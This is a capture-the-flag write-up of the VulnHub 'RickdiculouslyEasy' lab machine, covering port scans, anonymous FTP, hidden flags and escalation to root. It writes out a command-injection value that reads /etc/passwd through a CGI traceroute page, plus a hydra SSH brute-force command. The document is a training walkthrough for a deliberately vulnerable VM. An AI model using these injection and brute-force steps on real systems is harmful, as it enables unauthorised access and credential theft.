---
layout: default
---

# VulnHub - RickdiculouslyEasy writeup 

![RickdiculouslyEasy Header image](/assets/images/vh_rickdic/rickdiculouslyeasy_header.png)

[VulnHub image link](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

:computer: :cat:

## Introduction 

This systems is a Rick and Morty themed, with 9 flags hidden in various placed in the system. Enumeration is key to finding all these flags and will take us to some hidden safe places and involves a few techniques in order to find them all.

_Authors notes about the machine._
> This is a fedora server vm, created with virtualbox.
> It is a very simple Rick and Morty themed boot to root.
> There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.
> It's designed to be a beginner ctf, if you're new to pen testing, check it out!

## Initial recon

__Target IP address: 192.168.56.133__

### Nmap scan

Lets start by running a relatively fast (-T4) aggressive mode (-A) nmap SYN TCP scan of all ports (-p-) on the system, displaying it very verbosely (-vv) and outputting the results to all nmap output formats with (-oA)
```
sudo nmap -T4 -A -vv -p- 192.168.56.133 -oA tcp_agg_all
```

I did not conduct a UDP scan on this system as the TCP results outputted enough open ports for investigation.
If you wish you can run a UDP version scan with default nmap scripts on the top 1000 ports with the command below.
```
sudo nmap -sUVC -vv -oA udp_top_1000 192.168.56.133
```

#### TCP Scan Results

The TCP nmap scan reveals a few interesting ports of interest, FTP(21), Apache Web Server(80), Cockpit remote manager (9090), SSH on non-default port 22222 and unknown services on port 13337 and 60000. 
```
# Nmap 7.80 scan initiated Thu Aug 27 10:22:56 2020 as: nmap -T4 -A -vv -p- -oA tcp_agg_all 192.168.56.133
Nmap scan report for 192.168.56.133
Host is up, received arp-response (0.00049s latency).
Scanned at 2020-08-27 10:22:57 EDT for 49s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?    syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http    syn-ack ttl 64 Cockpit web service
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.56.133:9090/
13337/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNvEvp4kqXX1H6FNqkKASBizY59uyLsqrLzLfT4R5vD8yuq+K0OqomxTiDwipMZTfQIRuBl2OzXX3rzRQ0aB+4EXyLbsxqNNP/+xRgPgFL6FPNI7j2rPGt+hQ6nmkpBJzzSpA4BBlGwvQt/i4LhrRoDsuD2JxQlmH1LNAlG6rE+xyqMTEgnfnO70pYzcmxDOixHiqTkbrsGnE6kIiyiOopwsR2E2KLPusFQJhEhsOOCJzurO7YYbDxQIwOMOox96SPtgti+4bnAVndLpo/IddtzZu3PB4SK43aIeGWgP7ONl6H0Cs1opW1EQSmdpww+Nu3fMlAlC+VMfmJNca8z9Np
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKqM0Vcrgqds3NsV5wJ7j876UEKSpMytY6gNpa0Ey47sSAizc+hUU8UGoFmPsco2rjIn9QhdEIWzeMJksnpbxDk=
|   256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJ5AJGj4+y9xHabmQ5cLyxySqPvQ9sW+ko0w1vnzZWI
60000/tcp open  unknown syn-ack ttl 64
|_drda-info: ERROR
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.80%I=7%D=8/27%Time=5F47C1C6%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.80%I=7%D=8/27%Time=5F47C1C6%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.80%I=7%D=8/27%Time=5F47C1CC%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/27%OT=21%CT=1%CU=40211%PV=Y%DS=1%DC=D%G=Y%M=080027%T
...
Uptime guess: 9.017 days (since Tue Aug 18 09:59:36 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.56.133

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 27 10:23:46 2020 -- 1 IP address (1 host up) scanned in 50.83 seconds
```

Port 13337 reveals the our first flag:
> FLAG:{TheyFoundMyBackDoorMorty}-10Points

You can use netcat to connect to the port manually and grab its output.
```
nc -nv 192.168.56.133 13337
```

#### UDP Scan Results

For completeness the only open UDP port was 68 running dhclient. I had discovered this after rooting the box and running the netstat command below
```
netstat -plun
```

I confirmed this by running the following scan
```
sudo nmap -sUVC -p 68,323 192.168.56.133 -vv

PORT    STATE         SERVICE REASON              VERSION
68/udp  open|filtered dhcpc   no-response
323/udp closed        unknown port-unreach ttl 64
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
```

## Enumeration

### FTP (Port 21)

Lets start with FTP since its the first open port number. The nmap default scan script revealed that its allows Anonymous FTP logins, so lets do that.
```
ftp 192.168.56.133
# Enter anonymous as the name
# Enter anything for the password
# Download the flag with the command below
get FLAG.txt
```

Looking around the ftp folder we find our second flag and a pub directory that is empty.
> FLAG{Whoa this is unexpected} - 10 Points

![Anonymous FTP enumeration](/assets/images/vh_rickdic/vh_rickdiculous_ftp.jpg)

### Port 22

This is some troll rabbit hole port that outputs the wrong OS information.
> - kali@kali:~/Desktop/vulnhub/rickdiculously_easy$ nc -nv 192.168.56.133 22
> - (UNKNOWN) [192.168.56.133] 22 (ssh) open
> - Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)

### Apache httpd 2.4.27 ((Fedora)) Web Server (Port 80)

Manually checking out the website it lands on a plain html page with a picture of Morty. 

Inspecting the **robots.txt** reveals a few interesting links.
> * /cgi-bin/root_shell.cgi
> * /cgi-bin/tracertool.cgi
> * /cgi-bin/*

The root_shell.cgi link is a rabbit whole, however the tracertool.cgi link seems of interest as it executes the **traceroute** command on the system.
With a bit of enumeration we try to see if we can get command injection on the machine. Which seems like its possible by providing the semi-colon ; character and followed by a command. I tried to execute a bash and python reverse shell via this cgi page functionality but it appears to be locked down.

![Web Server Enumeration](/assets/images/vh_rickdic/vh_rickdiculous_web_1.jpg)

There appears to be also another troll feature with the **cat** command being replaced by output of an ascii art cat.
We can however use the **head** command to view sensitive files like the **/etc/passwd** file to get the Usernames on the system. (The -n parameter on the head command will print the first n lines you specify of the file.)
```
;head -n 40 /etc/passwd
```

![/etc/passwd](/assets/images/vh_rickdic/vh_rickdiculous_web_2.jpg)

#### Nikto Scan

Running a nikto scan on the web server reveals a **passwords** directory.
```
nikto -a 192.168.56.133 | tee nikto_scan.txt
```

![Web Enumeration](/assets/images/vh_rickdic/vh_rickdiculous_web_3.jpg)

We find a password **winter** hidden in the source code of the password.html page.
Within firefox use the following link to view the source code.
```
view-source:http://192.168.56.133/passwords/passwords.html
```

We also find another flag in the passwords directory
> FLAG{Yeah d- just don't do it.} - 10 Points

#### Ricks half baked reverse shell.... (Port 60000)

This is some custom shell script that doesn't allow for much, but there is a flag hidden in this blackhole that we can obtain.
> FLAG{Flip the pickle Morty!} - 10 Point

![Blackhole port](/assets/images/vh_rickdic/vh_rickdiculous_blackhole.jpg)

#### Cockpit Remote Server Monitor (Port 9090)

> Cockpit is an easy-to-use, lightweight and simple yet powerful remote manager for GNU/Linux servers, it’s an interactive server administration user interface that offers a live Linux session via a web browser. It can run on several Linux distributions including Debian, Ubuntu, Fedora, CentOS, RHEL, Arch Linux among others.

[Source Link](https://www.tecmint.com/cockpit-monitor-multiple-linux-servers-via-web-browser/)

Inspecting this reveals that this application is not fully enabled and leads to nowhere. This appears to be another rabbit hole. I did inspect the page and enabled hidden fields but to no avail.

There is a another flag on the page however.
> FLAG {There is no Zeus, in your face!} - 10 Points

![Cockpit Resource Monitor](/assets/images/vh_rickdic/vh_rickdiculous_cockpit.jpg)

### SSH (Port 22222)

Let try the password of **winter** we found earlier in combination with the usernames from the **/etc/passwd** file to try login to the system via SSH.
It appears the the password belongs to the user **Summer** and grants us with our initial access to the system.

![Summer SSH login](/assets/images/vh_rickdic/vh_rickdiculous_summer_shh.jpg)

We find another flag in Summers home directory. cat is trolling again us :/ you can see but use the head command to read the flag.
> FLAG{Get off the high road Summer!} - 10 Points

## Privilege Escalation

Now that we have access to the user Summer lets see if we can get access to the remaining users of **Morty**, **RickSanchez** and then the **root** account.

Checking out morty's home directory we find two interesting files. 
Spin up a simple python3 http server in the directory with the following command so that we can download these files with wget.
```
# On target system, make sure to not use a port already in use and you can background the command with &
python3 -m http.server 8181 &

# On the attacking system download the files using wget
wget 192.168.56.133:8181/journal.txt.zip
wget 192.168.56.133:8181/Safe_Password.jpg
```

![Mortys stuff](/assets/images/vh_rickdic/vh_rickdiculous_morty_journal.jpg)

Inspecting the files reveals a password protected zip (journal.txt.zip) and an image called **Safe_Password.jpg** but no password appears in the image, so lets inspect the image file further with **exiftool** to see the metadata and **binwalk** to inspect the actual file headers.

**binwalk** reveals a the password hidden in the image headers of **Meeseek**

We use this password to unzip the file and we find another flag in the **journal.txt** file.
> FLAG: {131333} - 20 Points 

![Safe Password](/assets/images/vh_rickdic/vh_rickdiculous_safe_image.jpg)

There is also a clue in the journal file to look for Rick's safe, so lets do that.
We find a binary elf file in RickShachez home directory. You can download by spinning another python3 web server and downloading it with wget again to reverse engineer it with ghidra or simply run it on your attacking system to reveal its secrets.

![Ricks Safe](/assets/images/vh_rickdic/vh_rickdiculous_ricks_safe.jpg)

While we could reverse engineer the binary file with [ghidra](https://ghidra-sre.org/) to view the assembly and source code, this would take some time. Instead just run the binary safe file and supply the previous flag value of **131333**  as an argument to reveal another flag and a clue for Ricks password.
> FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

The clue is that his password contains 1 uppercase character, 1 digit and 1 word in his old bands name which is **"The Flesh Curtains"**.
With a bit of password mutation enumeration I find the password is **P7Curtains**

You can use hydra to brute force the SSH login for the user RickSanchez and supply it with a list of mutated passwords that follow the above pattern. Hashcat can generate the mutated passwords for you.
```
sudo hydra -l RickSanchez -P /home/kali/Desktop/ricks_mutated_passwords.txt ssh://192.168.56.133 
```

![Ricks band](/assets/images/vh_rickdic/vh_rickdiculous_ricks_band.jpg)

Running **sudo -l** as Rick reveals that he can run **ALL** commands as sudo, so we simply just **sudo su** to become the super user of root and find the final flag giving us all 130 points.
> FLAG: {Ionic Defibrillator} - 30 points

```
sudo -l
sudo su
id
cd /root
ls
head FLAG.txt
```

![Root](/assets/images/vh_rickdic/vh_rickdiculous_root.jpg)

You can run **netstat -plunt** to see all open TCP and UDP ports just to confirm out nmap scan open ports.

## Summary

This system was fun and had a few rabbit holes and odd behaviors that needed certain tricks to overcome it. It involved quite a lot of enumeration to find all the flags making it quite a fun experience to hunt throughout the system for all the flags.

## References
[Rick and Morty](https://en.wikipedia.org/wiki/Rick_and_Morty)